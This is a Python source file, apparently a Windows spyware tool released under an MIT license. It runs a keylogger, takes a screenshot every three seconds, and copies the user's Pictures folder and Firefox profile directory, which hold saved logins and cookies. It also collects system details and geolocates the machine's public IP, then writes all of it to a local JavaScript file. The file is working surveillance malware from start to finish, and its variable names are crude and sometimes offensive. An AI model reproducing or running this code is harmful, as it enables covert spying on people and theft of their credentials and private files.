# The MIT License (MIT)
#Copyright © 2025 tromoSM
#Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
#The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
#THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
import socket
import subprocess
import platform
import json
import os
import glob
import sys
import time
import psutil
from pynput import keyboard
from pynput.keyboard import Key 
import win32gui
from pywinauto import Desktop
import pyautogui
import win32api
from datetime import datetime
import windowsapps
import string
import requests
import platform
import uuid
import random
import geocoder
import shutil

totЯ= os.path.expanduser("~")
manfuckthisshit=os.path.join(totЯ, "Pictures")
adrian=f"./user-files/image"

diddyahh= os.path.expanduser("~")
explainourfriend=os.path.join(diddyahh, "AppData\Roaming\Mozilla\Firefox\Profiles")
myahh=f"./user-files/firefox"
#                                   _________  ________  ________  _____ ______   ________  ________  _____ ______                                        
#                                  |\___   ___\\   __  \|\   __  \|\   _ \  _   \|\   __  \|\   ____\|\   _ \  _   \                                      
#                                  \|___ \  \_\ \  \|\  \ \  \|\  \ \  \\\__\ \  \ \  \|\  \ \  \___|\ \  \\\__\ \  \                                     
#                                       \ \  \ \ \   _  _\ \  \\\  \ \  \\|__| \  \ \  \\\  \ \_____  \ \  \\|__| \  \                                    
#                                        \ \  \ \ \  \\  \\ \  \\\  \ \  \    \ \  \ \  \\\  \|____|\  \ \  \    \ \  \                                   
#                                         \ \__\ \ \__\\ _\\ \_______\ \__\    \ \__\ \_______\____\_\  \ \  \    \ \  \                                  
#                                          \|__|  \|__|\|__|\|_______|\|__|     \|__|\|_______|\_________\ |__|    \ |__|                          
#                                                                                             \|_________|_|__|     \|__|                                               
#                                                                                                                   

eeffoc = 0.6
ISbeta =True
ISpublic =False
DateRelease="09.25.2025 as MM.DD.YYYY"
isdisgoodahhchecker=random.choice(string.ascii_letters)
getBLOCK = time.time()

win32api.Beep(3000,1)
win32api.Beep(3000,5)
win32api.Beep(3000,1)

ifVar = platform.platform()
propetyinegypt=platform.system()
choppedchinPRO=platform.processor()
choppedchin=platform.machine()
ipofda=socket.gethostbyname(socket.gethostname())
hamborgar = socket.gethostname()

win32api.GetSystemInfo()

if ISbeta==True :
   betaVaccessISO="beta -"
else :
   betaVaccessISO=" -"
if ISpublic==True:
   barbershophaircutthatcostaquater="-PUBLIC"
else:
   barbershophaircutthatcostaquater="-PRIVATE"


tssoTuffboii = glob.glob('./resources/*')
for portableahh in tssoTuffboii:
    os.remove(portableahh)

a = win32gui.FindWindow(None, "Untitled - Notepad")
addRfuC = 0
def wedontspeaktacos():
       global addRfuC 
       addRfuC += 1 
       thedamnthing = pyautogui.screenshot()   
       thedamnthing.save(f"./resources/{addRfuC}.png")
      
 
fuckme = 3
windows = pyautogui.getAllWindows()
for window in windows:
        aa = window.title
fckmeinstead = psutil.net_io_counters()

fakeahh4k = datetime.now()
heisenberg = fakeahh4k.year
kanye =fakeahh4k.month
dawgWater = fakeahh4k.day
hitlerAss = f"{fakeahh4k.hour:02}" 
TrumpBrochacho =f"{fakeahh4k.minute:02}" 
fuckingportableass = f"{heisenberg}:{kanye}:{dawgWater}:{hitlerAss}:{TrumpBrochacho}"
ipNE= f"{socket.gethostbyname(socket.gethostname())}"
if ':' in ipNE:
   ipvch = "wifiACRBR"
else : 
   ipvch = "echoeUSSR"
   
try:
 import pynput
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])


import pynput

from pynput import keyboard

thedamnlist = []
def on_press(key):
    
    try:  
       thedamnlist.append('"{0}'.format(key.char)+'",')
    except AttributeError:
      if key == Key.space:
       thedamnlist.append("'',")
      elif key == Key.enter:
       thedamnlist.append("'helpme',")
      elif key == Key.tab:
        thedamnlist.append("`ARC09pmo`,")
      elif key == Key.backspace:
        thedamnlist.append("'E2 8C AB',")
      elif key == Key.alt:
         thedamnlist.append("'alt-',")
      elif key == Key.shift or key == Key.shift_l or key ==  Key.shift_r:
         thedamnlist.append("`shift`,")
      elif key == Key.alt or  key == Key.alt_l or  key == Key.alt_r:
         thedamnlist.append("`Alt`,")
      elif key == Key.ctrl or key == Key.ctrl_l or key == Key.ctrl_r:
         thedamnlist.append("`Ctrl`,")
      elif key == Key.alt_gr:
         thedamnlist.append("`ctrlaltPre`,")
      elif key == Key.down:
          thedamnlist.append("'ctDown',")
      elif key == Key.up:
          thedamnlist.append("'ctUp',")
      elif key == Key.left:
          thedamnlist.append("'ctLeft',")
      elif key == Key.right:
          thedamnlist.append("'ctRight',")
      elif key == Key.caps_lock:
        thedamnlist.append("'CAPS',") 
      elif key == Key.cmd:
         thedamnlist.append("'windowsKEY',")
      elif key == Key.esc:
         thedamnlist.append('"---[exiting ahh]---"')
      elif "Key." in key:
          thedamnlist.append('`{0}`,'.format(str(key)[4:]))
      else :
       thedamnlist.append('`{0}`,'.format(str(key)))
      
         

def on_release(key):
    if key == keyboard.Key.esc:
             
        win32api.Beep(32767,37)
        win32api.Beep(50,7)
        win32api.Beep(5067,17)
        return False
    
ahhGoddamnitwhomadepythoonthiscomplicated = keyboard.Listener(on_press=on_press, on_release=on_release)
ahhGoddamnitwhomadepythoonthiscomplicated.start()

     
while ahhGoddamnitwhomadepythoonthiscomplicated.running:
    wedontspeaktacos()
    time.sleep(fuckme)

print("".join(thedamnlist))

import os
try :
   doxxthatbih=requests.get("https://ifconfig.me").text.strip()
   iststuffvro=geocoder.ip(doxxthatbih)
except :
   doxxthatbih="The device isnt connected to any network" 
   iststuffvro="nRCsotuffpyERR-67UXPY" 
   
filepath = os.path.join(os.path.dirname(__file__), "textahh.js")
 
if os.path.exists(filepath):
    with open(filepath, "r", encoding="utf-8" ) as ss:
        bitchass = ss.read()
else:
    bitchass = ""
trBLOCK= time.time()
try : 
   shutil.copytree(manfuckthisshit,adrian)
   win32api.Beep(100,67)

   adrianValue=True
except :
   adrianValue=False
   win32api.Beep(1000,670)

try : 
   win32api.Beep(100,67)
   shutil.copytree(explainourfriend,myahh)
   fuhfuh=True
except :
   win32api.Beep(1000,670)
   fuhfuh=False

with open(filepath, "w") as fucker:
    fucker.write("const $fr = [")
    fucker.write("".join(thedamnlist))
    fucker.write("];")
    fucker.write(f"\nconst $yea = '{hitlerAss}' ;")
    fucker.write(f"\nconst $nah = '{TrumpBrochacho}' ;")
    fucker.write(f"\nconst $val = {addRfuC};")
    fucker.write(f"\nconst $wtf = `{ifVar}`;\n const $eggsuka = `{propetyinegypt}`; \n const $demarcusjrthethird = `{choppedchin}`;\n const $proAhh = `{choppedchinPRO}`;\n const $ipofda = `{ipofda}`; \n const $doxxthatbih=`{doxxthatbih}`; \n const $slowahhprovider = `{hamborgar}`;")
    fucker.write(f"\nconst $sysinfoproahhcomplex=`{psutil.virtual_memory()}`;")
    fucker.write(f"\nconst $guy=`{win32api.GetUserName()}`;")
    fucker.write(f"\nconst $wastedtime=`{win32api.GetTickCount()}`;")
    fucker.write(f"\nconst $ram={win32api.GlobalMemoryStatus()};")
    fucker.write(f"\nconst $ipV=`{ipvch}`;")
    fucker.write(f"\nconst $diskshit=`{psutil.disk_usage('/').percent}`")
    fucker.write(f"\nconst $netiomyass={fckmeinstead.bytes_sent};\nconst $$netiomyass={fckmeinstead.bytes_recv};")
    fucker.write(f"\nconst $apps={json.dumps(windowsapps.get_apps())};")
    fucker.write(f"\n const $getmesomeapplesfromtheseveneleven={trBLOCK-getBLOCK}")
    fucker.write(f"\n $nullrnot=`{isdisgoodahhchecker}`")
    fucker.write(f"\n$ahh=`{iststuffvro.city},{iststuffvro.country}`") 
    fucker.write(f"\n$freeloader=`{iststuffvro.latlng}`") 
    fucker.write(f"\nconst $thedamnfiles=`{adrianValue}`;")
    fucker.write(f"\nconst $noojohnporknoo=String.raw`{os.getcwd()}`;")
    fucker.write(f"\nconst $defaultahh=String.raw`{totЯ}`;")
    fucker.write(f"\n\n$$version=`V{eeffoc} {betaVaccessISO}{barbershophaircutthatcostaquater} Release ({DateRelease})`") 
       
